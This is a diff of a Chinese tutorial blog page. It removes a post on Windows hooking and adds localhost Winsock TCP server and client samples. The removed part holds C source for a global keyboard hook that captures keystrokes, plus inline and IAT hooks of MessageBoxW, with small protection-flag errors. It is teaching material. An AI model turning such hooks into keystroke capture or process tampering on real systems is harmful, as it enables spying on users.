@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Hook原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-windows网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/Hook原理/">HooK原理</a>
+      <a class="article-title" href="/2018/08/20/windows网络编程/">windows网络编程</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/Hook原理/" class="archive-article-date">
+        <a href="/2018/08/20/windows网络编程/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -179,23 +179,32 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>万能神奇Hook:<br>1.系统提供的消息Hook机制<br>2.自定义的Hook汇编技巧</p>
-<blockquote>
-<p>消息钩子例子</p>
-</blockquote>
-<p>1.SetWindowsHookEx设置钩子<br>2.CallNextHookEx为钩子链的下一个程序设置钩子<br>3.UnhookWindowsHookEx卸载钩子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook;</span><br><span class="line">HMODULE g_hModule;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK KeyboardProc(</span><br><span class="line">	int code,           // 消息类型</span><br><span class="line">	WPARAM wParam,      // 虚拟码</span><br><span class="line">	LPARAM lParam) &#123;    // 按键信息</span><br><span class="line"></span><br><span class="line">	// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作</span><br><span class="line">	if (code == HC_ACTION)&#123;</span><br><span class="line">		// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续</span><br><span class="line">		BYTE KeyState[256] = &#123; 0 &#125;;</span><br><span class="line">		if (GetKeyboardState(KeyState)) &#123;</span><br><span class="line">			// 得到第16–23位，键盘虚拟码</span><br><span class="line">			LONG  KeyInfo = lParam;</span><br><span class="line">			UINT  keyCode = (KeyInfo &gt;&gt; 16) &amp; 0x00ff;</span><br><span class="line">			WCHAR wKeyCode = 0;</span><br><span class="line">			ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, 0);</span><br><span class="line">			// 将其打印出来</span><br><span class="line">			WCHAR szInfo[512] = &#123; 0 &#125;;</span><br><span class="line">			swprintf_s(szInfo, 512, L&quot;Hook_%c&quot;, (char)wKeyCode);</span><br><span class="line">			OutputDebugString(szInfo);</span><br><span class="line">			return 0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL InstallHook() &#123;</span><br><span class="line">	g_Hook = SetWindowsHookEx(</span><br><span class="line">		WH_KEYBOARD,//按键消息的钩子</span><br><span class="line">		KeyboardProc, //回调函数</span><br><span class="line">		g_hModule,</span><br><span class="line">		0);</span><br><span class="line"></span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">// 导出函数：卸载钩子</span><br><span class="line">BOOL UninstallHook() &#123;</span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">		g_hModule = hModule;</span><br><span class="line">		InstallHook();</span><br><span class="line"></span><br><span class="line">		break;</span><br><span class="line">// 	case DLL_THREAD_ATTACH:</span><br><span class="line">// 	case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		//UninstallHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>自定义钩子</p>
+        <blockquote>
+<p>TCP_SOCKET</p>
 </blockquote>
 <ul>
-<li><p>内联Hook<br>通过修改Opcode 使原本跳转到原函数的地址变成跳转到制定函数的地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void UnHook();</span><br><span class="line">void OnHook();</span><br><span class="line">BYTE g_old[5];</span><br><span class="line">BYTE g_New[5] = &#123;0xE9&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line">	//卸载钩子</span><br><span class="line">	UnHook();</span><br><span class="line">	int nRet = MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">	//安装钩子</span><br><span class="line">	OnHook();</span><br><span class="line">	return nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void OnHook()</span><br><span class="line">&#123;</span><br><span class="line">	//获取MessageBoxW地址</span><br><span class="line">	DWORD dwMsg = (DWORD)MessageBoxW;</span><br><span class="line">	DWORD dwMyMsg = (DWORD)MyMessageBoxW;</span><br><span class="line">	//计算偏移 offset = 目标地址 - jmp所在地址 - 指令长度</span><br><span class="line">	DWORD dwOffset = dwMyMsg - dwMsg - 5;</span><br><span class="line"></span><br><span class="line">	//保存原来的Opcode</span><br><span class="line">	memcpy(g_old, MessageBoxW, 5);</span><br><span class="line">	//构造Hook地址</span><br><span class="line">	*(DWORD*)(g_New + 1) = dwOffset;</span><br><span class="line">	//修改地址</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW,g_New,  5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW, g_old, 5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	OnHook();</span><br><span class="line">	MessageBox(0,0,0,0);</span><br><span class="line">	UnHook();</span><br><span class="line">	MessageBox(0, 0, 0, 0);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li><p>TCP服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#define _WINSOCK_DEPRECATED_NO_WARNINGS </span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">//TCP服务器</span><br><span class="line">// 1. 初始化环境</span><br><span class="line">// 2. 创建套接字</span><br><span class="line">// SOCKET WSAAPI socket(</span><br><span class="line">// 	_In_  int af,       // 通信协议族</span><br><span class="line">// 	_In_  int type,     // 套接字类型</span><br><span class="line">// 	_In_  int protocol);// 传输协议(前两个参数确定后，可以设置为0)</span><br><span class="line">// af类型：</span><br><span class="line">// AF_INET        //internet 协议(使用TCP UDP协议)</span><br><span class="line">// AF_IRDA        //红外协议</span><br><span class="line">// AF_BTH         //蓝牙协议</span><br><span class="line">// ……</span><br><span class="line">// type类型</span><br><span class="line">// SOCK_STREAM    //流式 socket（需建立连接，通信过程可靠）</span><br><span class="line">// SOCK_DGRAM     //数据报 socket（无需建立连接，通讯过程不可靠）</span><br><span class="line">// SOCK_RAW       //原始套接字</span><br><span class="line">// ……</span><br><span class="line">// protocol类型</span><br><span class="line">// IPPROTO_TCP    //当type类型为SOCK_STREAM 时</span><br><span class="line">// IPPROTO_UDP    //当type类型为SOCK_DGRAM 时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 3. 绑定</span><br><span class="line">// 4. 监听</span><br><span class="line">// 5. 等待连接</span><br><span class="line">// 6. 发送接收</span><br><span class="line">// 7. 关闭套接字</span><br><span class="line">// 8. 清理环境</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// 1. 初始化环境</span><br><span class="line">	WSADATA wd = &#123;0&#125;;</span><br><span class="line">	int Iret;</span><br><span class="line">	Iret = WSAStartup(</span><br><span class="line">		MAKEWORD(2, 2),		//请求的版本号 2.2</span><br><span class="line">		&amp;wd);				//版本信息</span><br><span class="line"></span><br><span class="line">	if (Iret!=0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;初始化失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 2. 创建套接字</span><br><span class="line">	SOCKET Sscok = socket(</span><br><span class="line">		AF_INET,		//通信协议族</span><br><span class="line">		SOCK_STREAM,	//套接字类型</span><br><span class="line">		IPPROTO_TCP);	//协议类型</span><br><span class="line">	if (Sscok==INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;创建socket失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 3. 绑定</span><br><span class="line">	sockaddr_in Saddr = &#123; 0 &#125;;</span><br><span class="line">	Saddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	Saddr.sin_port = htons(0x1234);</span><br><span class="line">	Saddr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">	Iret = bind(</span><br><span class="line">		Sscok,				  //绑定的套接字</span><br><span class="line">		(sockaddr*)&amp;Saddr,	  //绑定服务地址</span><br><span class="line">		sizeof(Saddr)		  //地址大小</span><br><span class="line">	);</span><br><span class="line">	if (Iret==SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;绑定失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 4. 监听</span><br><span class="line">	listen(</span><br><span class="line">		Sscok,		//服务套接字</span><br><span class="line">		SOMAXCONN);	//连接最大数量</span><br><span class="line"></span><br><span class="line">	// 5. 等待连接</span><br><span class="line">		sockaddr_in Caddr = &#123; 0 &#125;;		//客户端地址</span><br><span class="line">		int CaddrSize = sizeof(Caddr);	//地址大小</span><br><span class="line"></span><br><span class="line">		SOCKET Csock = accept(			//返回客户端套接字</span><br><span class="line">			Sscok,						//服务端套接字字</span><br><span class="line">			(sockaddr*)&amp;Caddr,			//接收客户地址信息</span><br><span class="line">			&amp;CaddrSize);				//地址大小（必须填写大小）</span><br><span class="line"></span><br><span class="line">		if (Csock==INVALID_SOCKET)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;等待链接失败\n&quot;);</span><br><span class="line">			return 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	// 6. 发送接收</span><br><span class="line">		char buff[1024] = &#123;&#125;;</span><br><span class="line">		recv(</span><br><span class="line">			Csock,	//客户端套接字</span><br><span class="line">			buff,	//数据缓冲区</span><br><span class="line">			1024,	//接收字节数</span><br><span class="line">			0);		//标志</span><br><span class="line"></span><br><span class="line">		printf(&quot;接收客户信息：%s\n&quot;,buff);</span><br><span class="line">		system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">	// 7. 关闭套接字</span><br><span class="line">		closesocket(Csock);</span><br><span class="line">		closesocket(Sscok);</span><br><span class="line"></span><br><span class="line">	// 8. 清理环境</span><br><span class="line">		WSACleanup();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>IATHook<br>1.通过导入表查询到制定的函数名<br>2.根据函数名制定函数地址<br>3.替换函数地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int (WINAPI*FP_MSG)(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType);</span><br><span class="line"></span><br><span class="line">FP_MSG g_MyMsg;</span><br><span class="line">DWORD g_IAT_Addr;</span><br><span class="line">DWORD g_Addr;</span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line"></span><br><span class="line">	return g_MyMsg(hWnd, lpText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line">	*(DWORD*)g_IAT_Addr = (DWORD)g_MyMsg;</span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">   INT中函数名的下标与IAT中函数地址是一一对应的</span><br><span class="line">*/</span><br><span class="line">void IAT_hook(char* pFunName,char* pDllName)</span><br><span class="line">&#123;</span><br><span class="line">	//获取加载基址</span><br><span class="line">	HMODULE hMod = GetModuleHandle(NULL);</span><br><span class="line">	DWORD dwImageBase = (DWORD)hMod;</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = </span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + dwImageBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pImportDir = </span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)</span><br><span class="line">		&amp;pNt-&gt;OptionalHeader.DataDirectory[1];</span><br><span class="line">	//获取导入表地址</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImport = </span><br><span class="line">		(PIMAGE_IMPORT_DESCRIPTOR)</span><br><span class="line">		(pImportDir-&gt;VirtualAddress + dwImageBase);</span><br><span class="line">	</span><br><span class="line">	//遍历导入表，查找函数地址的位置</span><br><span class="line">	while (pImport-&gt;Name)</span><br><span class="line">	&#123;</span><br><span class="line">		char* pDll = (char*)(pImport-&gt;Name + dwImageBase);</span><br><span class="line">		//比对模块名（_stricmp比对时不区分大小写）</span><br><span class="line">		if (!_stricmp(pDll, pDllName))</span><br><span class="line">		&#123;</span><br><span class="line">			//IAT找到了</span><br><span class="line">			DWORD* pIAT = (DWORD*)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line">			DWORD* pINT = (DWORD*)(pImport-&gt;OriginalFirstThunk + dwImageBase);</span><br><span class="line"></span><br><span class="line">			while (*pINT)</span><br><span class="line">			&#123;</span><br><span class="line">				//最高位为0是名称导入的</span><br><span class="line">				if (!(*pINT &amp; 0x80000000))</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME pName =</span><br><span class="line">						(PIMAGE_IMPORT_BY_NAME)</span><br><span class="line">						(*pINT + dwImageBase);</span><br><span class="line">					//比对函数名称</span><br><span class="line">					if (!_stricmp(pName-&gt;Name,pFunName))</span><br><span class="line">					&#123;</span><br><span class="line">						//进来说明找到了</span><br><span class="line">						//保存原来的地址用于恢复</span><br><span class="line">						g_IAT_Addr = (DWORD)pIAT;</span><br><span class="line">						//将MessageBoxW地址赋值给函数指针</span><br><span class="line">						g_MyMsg = (FP_MSG)*pIAT;</span><br><span class="line">					    //IAT表的内存属性是只读</span><br><span class="line">						//需要修改内存属性为可写才能修改</span><br><span class="line">						DWORD dwOld;</span><br><span class="line">						VirtualProtect(pIAT, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">						//修改为自己的函数地址</span><br><span class="line">						*pIAT = (DWORD)MyMessageBoxW;</span><br><span class="line">						//恢复原来的属性</span><br><span class="line">						VirtualProtect(pIAT, 4, dwOld, &amp;dwOld);</span><br><span class="line">						return;</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				//下一个</span><br><span class="line">				pINT++;</span><br><span class="line">				pIAT++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		//下一个某块</span><br><span class="line">		pImport++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:		</span><br><span class="line">		IAT_hook(&quot;MessageBoxW&quot;,&quot;user32.dll&quot;);</span><br><span class="line">		break;</span><br><span class="line">	//case DLL_THREAD_ATTACH:</span><br><span class="line">	//case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		UnHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li><p>TCP客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#define _WINSOCK_DEPRECATED_NO_WARNINGS </span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">//TCP客户端</span><br><span class="line"></span><br><span class="line">//1. 初始化环境</span><br><span class="line">//2. 创建套接字</span><br><span class="line">//3. 发起连接</span><br><span class="line">//4. 发送接收数据</span><br><span class="line">//5. 关闭套接字</span><br><span class="line">//6. 清理环境</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	//1. 初始化环境</span><br><span class="line">	WSADATA wd = 